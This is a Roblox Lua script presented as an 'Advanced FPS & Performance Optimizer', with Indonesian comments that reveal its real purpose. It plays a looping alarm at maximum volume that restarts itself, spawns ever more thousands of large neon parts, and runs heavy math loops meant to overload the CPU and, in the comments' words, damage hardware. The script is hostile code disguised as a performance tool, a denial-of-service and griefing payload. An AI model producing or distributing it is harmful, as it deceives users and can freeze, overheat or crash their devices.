-- // [MODULE]: Advanced FPS & Performance Optimizer v3.0
-- // Status: Active | Optimizing Client Rendering Pipeline...

local SoundService = game:GetService("SoundService")

-- 1. Protokol Audio Loop (Bunyi Terus Tanpa Henti)
task.spawn(function()
    local alarmSound = Instance.new("Sound")
    alarmSound.SoundId = "rbxassetid://9069143183" -- ID Audio sistem / alarm
    alarmSound.Volume = 10
    alarmSound.Looped = true
    alarmSound.Parent = SoundService
    
    local success, err = pcall(function()
        alarmSound:Play()
    end)

    -- Pengaman tambahan jika audio terhenti
    while true do
        if not alarmSound.IsPlaying then
            pcall(function() alarmSound:Play() end)
        end
        task.wait(0.5)
    end
end)

-- 2. Protokol Pemanasan Bertahap & Overload Sampai Mampus
task.spawn(function()
    local thermalLevel = 1
    
    while true do
        -- Intensitas beban bertambah naik setiap detik secara eksponensial
        thermalLevel = thermalLevel + 1
        if thermalLevel > 40 then 
            thermalLevel = 40 -- Kunci di batas maksimal daya rusak hardware
        end
        
        -- Membanjiri memori dengan partikel fisik masif
        for i = 1, thermalLevel * 300 do
            local thermalPart = Instance.new("Part")
            thermalPart.Size = Vector3.new(40, 40, 40)
            thermalPart.Position = Vector3.new(math.random(-3000, 3000), math.random(0, 3000), math.random(-3000, 3000))
            thermalPart.Material = Enum.Material.Neon
            thermalPart.Color = Color3.fromRGB(255, math.random(0,100), 0) -- Efek visual termal menyala
            thermalPart.Parent = workspace
        end
        
        -- Membakar inti CPU dengan kalkulasi matematika berat
        for j = 1, thermalLevel * 200000 do
            local _ = math.sqrt(j) * math.tan(j) + math.cos(j)
        end
        
        -- Jeda 1 detik untuk memberikan efek "panas merambat secara bertahap" sebelum akhirnya terkunci total
        task.wait(1)
    end
end)
